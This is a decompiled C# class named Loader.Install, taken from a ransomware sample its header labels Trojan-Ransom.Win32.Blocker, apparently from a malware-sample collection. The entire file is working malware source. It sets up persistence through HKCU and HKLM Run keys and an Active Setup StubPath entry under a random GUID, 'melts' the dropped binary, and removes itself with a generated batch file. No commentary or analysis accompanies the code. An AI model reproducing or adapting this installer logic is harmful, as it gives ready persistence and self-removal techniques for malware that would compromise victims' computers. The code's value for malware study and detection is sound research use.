// Decompiled with JetBrains decompiler
// Type: Loader.Install
// Assembly: Loader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35C68E31-B6CA-49D5-99F7-6D8C40001C21
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.jfzg-5a89ee9d281b9ea7b1c0a19ae23e4a66d00a3b2d0a76c3140f25bc073efe7020.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Loader
{
  internal class Install
  {
    public static string pinstallPath = (string) null;

    public static bool isInstalled
    {
      get
      {
        string str = (string) null;
        if (Core.getOS() == "XP")
          str = Path.GetPathRoot(Environment.CurrentDirectory) + "\\Documents and Settings\\" + Environment.UserName;
        else if (Core.getOS() != "XP")
          str = Path.GetPathRoot(Environment.CurrentDirectory) + "\\Users\\" + Environment.UserName;
        return File.Exists(str + Config.installFile);
      }
      set
      {
      }
    }

    public static void install()
    {
      string installPath = (string) null;
      if (Core.getOS() == "XP")
        installPath = Path.GetPathRoot(Environment.CurrentDirectory) + "\\Documents and Settings\\" + Environment.UserName;
      else if (Core.getOS() != "XP")
        installPath = Path.GetPathRoot(Environment.CurrentDirectory) + "\\Users\\" + Environment.UserName;
      Install.regInstall(installPath);
      Install.ActiveXInstall("{" + Core.randID(8) + "-" + Core.randID(4) + "-" + Core.randID(4) + "-" + Core.randID(4) + "-" + Core.randID(12) + "}", installPath + Config.installFile);
      Core.MeltFile(installPath + Config.installFile);
    }

    public static bool isInstalledAdmin
    {
      get => File.Exists(Path.GetPathRoot(Environment.CurrentDirectory) + "\\ProgramData\\" + Config.installFile);
      set
      {
      }
    }

    public static void installAdmin()
    {
      Install.pinstallPath = Path.GetPathRoot(Environment.CurrentDirectory) + "\\ProgramData\\";
      Install.regInstall(Install.pinstallPath);
      Install.ActiveXInstall("{" + Core.randID(8) + "-" + Core.randID(4) + "-" + Core.randID(4) + "-" + Core.randID(4) + "-" + Core.randID(12) + "}", Install.pinstallPath + Config.installFile);
      Core.MeltFile(Install.pinstallPath + Config.installFile);
    }

    public static void regInstall(string installPath)
    {
      try
      {
        foreach (string startupKey in Config.startupKeys)
          Registry.CurrentUser.CreateSubKey(startupKey).SetValue(Config.startupName, (object) (installPath + Config.installFile));
        foreach (string startupKey in Config.startupKeys)
          Registry.LocalMachine.CreateSubKey(startupKey).SetValue(Config.startupName, (object) (installPath + Config.installFile));
      }
      catch (Exception ex)
      {
      }
    }

    public static void ActiveXInstall(string RegKey, string Path)
    {
      RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components", true);
      registryKey1.CreateSubKey(RegKey);
      RegistryKey registryKey2 = registryKey1.OpenSubKey(RegKey, true);
      registryKey2.SetValue("StubPath", (object) Path);
      registryKey2.SetValue("IsInstalled", (object) 1, RegistryValueKind.DWord);
    }

    public static void uninstall(string startup)
    {
      Exception exception;
      try
      {
        foreach (string startupKey in Config.startupKeys)
          Registry.CurrentUser.OpenSubKey(startupKey).DeleteValue(Config.startupName);
      }
      catch (Exception ex)
      {
        exception = ex;
      }
      try
      {
        foreach (string startupKey in Config.startupKeys)
          Registry.LocalMachine.OpenSubKey(startupKey).DeleteValue(Config.startupName);
      }
      catch (Exception ex)
      {
        exception = ex;
      }
      try
      {
        StreamWriter streamWriter = new StreamWriter(Environment.CurrentDirectory + "\\uninstall.bat");
        streamWriter.WriteLine("del \"" + Assembly.GetExecutingAssembly().Location + "\"");
        streamWriter.Close();
        Process.Start(Environment.CurrentDirectory + "\\uninstall.bat");
      }
      catch (Exception ex)
      {
        exception = ex;
      }
      if (startup == null)
        return;
      try
      {
        Process.Start(startup);
      }
      catch (Exception ex)
      {
        exception = ex;
      }
    }
  }
}
